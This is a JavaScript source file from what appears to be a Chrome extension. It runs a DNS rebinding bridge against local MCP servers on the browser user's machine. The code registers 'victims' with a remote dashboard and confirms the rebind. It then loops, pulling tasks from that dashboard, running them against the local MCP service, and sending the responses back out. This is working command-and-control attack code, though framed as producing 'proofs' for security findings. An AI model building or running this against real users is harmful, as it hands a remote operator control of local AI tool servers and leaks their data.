import { MessageType } from "../src/messages.js";
import {
  recordDashboardEvent,
  recordDashboardResult,
  registerDashboardSession,
  registerDashboardVictim,
  takeDashboardTasks
} from "../src/dashboard-client.js";
import { bridgeContext, eventPayload, executeBridgeTask, resultPayload, runRebindBridge, sessionPayload } from "../src/rebind-bridge-core.js";
import { dashboardBaseFromRuntimeConfig, loadRuntimeConfig } from "../src/runtime-config.js";

let activeRun = null;
let stopRequested = false;

chrome.runtime.onMessage.addListener((message, _sender, sendResponse) => {
  if (!message) {
    return false;
  }

  if (message.type === MessageType.OffscreenStopRebindBridge) {
    stopRequested = true;
    const stoppedRun = activeRun;
    if (activeRun?.controller) {
      activeRun.controller.abort();
    }
    activeRun = null;
    if (stoppedRun) {
      chrome.runtime.sendMessage({
        type: MessageType.RebindBridgeLog,
        payload: {
          sessionId: stoppedRun.sessionId,
          clientRunId: stoppedRun.clientRunId,
          status: "stopped"
        }
      }).catch(() => {});
    }
    sendResponse({ status: "stopped" });
    return false;
  }

  if (message.type !== MessageType.OffscreenStartRebindBridge) {
    return false;
  }

  startBridge(message.payload)
    .then((result) => sendResponse(result))
    .catch((error) => {
      sendResponse({
        type: MessageType.RebindBridgeError,
        error: error instanceof Error ? error.message : String(error)
      });
    });

  return true;
});

async function startBridge(payload = {}) {
  if (activeRun) {
    return {
      type: MessageType.RebindBridgeAlreadyRunning,
      payload: {
        sessionId: activeRun.sessionId,
        descriptor: activeRun.descriptor,
        mcpName: activeRun.mcpName,
        clientRunId: activeRun.clientRunId,
        message: "A DNS rebind bridge is already running. Stop it before launching another MCP proof."
      }
    };
  }

  stopRequested = false;
  const runtimeConfig = await loadRuntimeConfig();
  const dashboardBaseUrl = dashboardBaseFromRuntimeConfig(runtimeConfig);
  if (!dashboardBaseUrl) {
    throw new Error("Remote dashboard is not configured. Pack the extension with a dashboardBaseUrl before launching DNS rebind proof.");
  }

  const dashboard = remoteDashboardProxy(dashboardBaseUrl, runtimeConfig.ingestToken);
  const descriptor = payload.descriptor;
  const randomPart = crypto.getRandomValues(new Uint32Array(1))[0].toString(16).padStart(8, "0").slice(0, 6);
  const sessionId = `bridge-${Date.now().toString(16)}-${randomPart}`;
  const controller = new AbortController();
  activeRun = { sessionId, descriptor, mcpName: payload.mcpName || mcpNameFromFinding(payload.finding), controller, clientRunId: payload.clientRunId };

  const result = await runRebindBridge({
    finding: payload.finding,
    descriptor,
    dashboard,
    fetchImpl: fetch,
    sessionId,
    attempts: payload.attempts || 120,
    delayMs: payload.delayMs || 1000,
    signal: controller.signal,
    onAttempt: async (attempt, context) => {
      if (stopRequested || activeRun?.sessionId !== sessionId) {
        return;
      }
      await dashboard.recordEvent(eventPayload(context, "bridge", "attempt", attempt, {
        sessionId,
        kind: "bridge.attempt",
        data: attempt
      }));
      chrome.runtime.sendMessage({
        type: MessageType.RebindBridgeLog,
        payload: {
          sessionId,
          clientRunId: payload.clientRunId,
          ...attempt
        }
      }).catch(() => {});
    }
  });

  if (!activeRun || activeRun.sessionId !== sessionId) {
    return {
      type: MessageType.RebindBridgeResult,
      payload: {
        ...result,
        session: {
          ...(result.session || {}),
          status: "stopped"
        },
        proof: {
          ...(result.proof || {}),
          tested: true,
          result: "stopped"
        }
      }
    };
  }

  if (result.proof.result === "rebind_confirmed") {
    activeRun.descriptor = result.session?.descriptor || descriptor;
    runTaskLoop({
      dashboard,
      descriptor: activeRun.descriptor,
      session: result.session
    }).catch((error) => {
      dashboard.recordEvent({
        sessionId,
        kind: "bridge.taskLoopError",
        data: {
          error: error instanceof Error ? error.message : String(error)
        }
      });
    });
  } else {
    activeRun = null;
  }

  return {
    type: MessageType.RebindBridgeResult,
    payload: result
  };
}

async function runTaskLoop({ dashboard, descriptor, session }) {
  let tick = 0;
  const context = bridgeContext({
    descriptor,
    sessionId: session.id,
    victimId: session.victimId,
    createdMs: session.createdMs
  });

  while (!stopRequested && activeRun?.sessionId === session.id) {
    let tasks = [];
    try {
      tasks = await dashboard.takeTasks(session.id);
    } catch (error) {
      await dashboard.recordEvent(eventPayload(context, "task", "poll-error", {
        error: error instanceof Error ? error.message : String(error)
      }, {
        sessionId: session.id,
        kind: "task.pollError",
        data: {
          error: error instanceof Error ? error.message : String(error)
        }
      }));
    }

    for (const task of tasks || []) {
      await dashboard.recordEvent(eventPayload(context, "task", "claimed", task, {
        sessionId: session.id,
        kind: "task.claimed",
        data: task
      }));
      try {
        const execution = await executeBridgeTask({
          descriptor,
          session,
          task,
          fetchImpl: fetch
        });
        await dashboard.recordResult(resultPayload(context, task.kind, {
          task,
          response: execution.response.body,
          status: execution.response.status
        }, {
          sessionId: session.id,
          kind: task.kind,
          task
        }));
        await dashboard.recordEvent(eventPayload(context, "task", "ok", {
          task: task.id,
          kind: task.kind,
          status: execution.response.status
        }, {
          sessionId: session.id,
          kind: "task.ok",
          data: {
            task: task.id,
            kind: task.kind,
            status: execution.response.status
          }
        }));
      } catch (error) {
        const message = error instanceof Error ? error.message : String(error);
        await dashboard.recordResult(resultPayload(context, "task.error", {
          task,
          error: message,
          details: error?.details || {}
        }, {
          sessionId: session.id,
          kind: "task.error",
          task
        }));
        await dashboard.recordEvent(eventPayload(context, "task", "error", {
          task: task.id,
          kind: task.kind,
          error: message,
          details: error?.details || {}
        }, {
          sessionId: session.id,
          kind: "task.error",
          data: {
            task: task.id,
            kind: task.kind,
            error: message,
            details: error?.details || {}
          }
        }));
      }
    }

    if (tick % 10 === 0) {
      await dashboard.registerSession(sessionPayload(context, "polling", {
        ...session,
        mcpSessionId: session.mcpSessionId,
        protocolVersion: session.protocolVersion
      }));
    }
    tick += 1;
    await delay(800);
  }

  await dashboard.registerSession(sessionPayload(context, stopRequested ? "stopped" : "idle", {
    ...session,
    mcpSessionId: session.mcpSessionId,
    protocolVersion: session.protocolVersion
  }));
  if (activeRun?.sessionId === session.id) {
    activeRun = null;
  }
}

function mcpNameFromFinding(finding) {
  return [
    finding?.fingerprint?.serverName,
    finding?.fingerprint?.serverVersion
  ].filter(Boolean).join(" ") || finding?.baseUrl || `${finding?.target || "local"}:${finding?.port || "unknown"}`;
}

function remoteDashboardProxy(baseUrl, ingestToken = "") {
  return {
    registerVictim(value) {
      return registerDashboardVictim(baseUrl, value, ingestToken);
    },
    registerSession(value) {
      return registerDashboardSession(baseUrl, value, ingestToken);
    },
    recordEvent(value) {
      return recordDashboardEvent(baseUrl, value, ingestToken);
    },
    recordResult(value) {
      return recordDashboardResult(baseUrl, value, ingestToken);
    },
    takeTasks(sessionId) {
      return takeDashboardTasks(baseUrl, sessionId, ingestToken);
    }
  };
}

function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
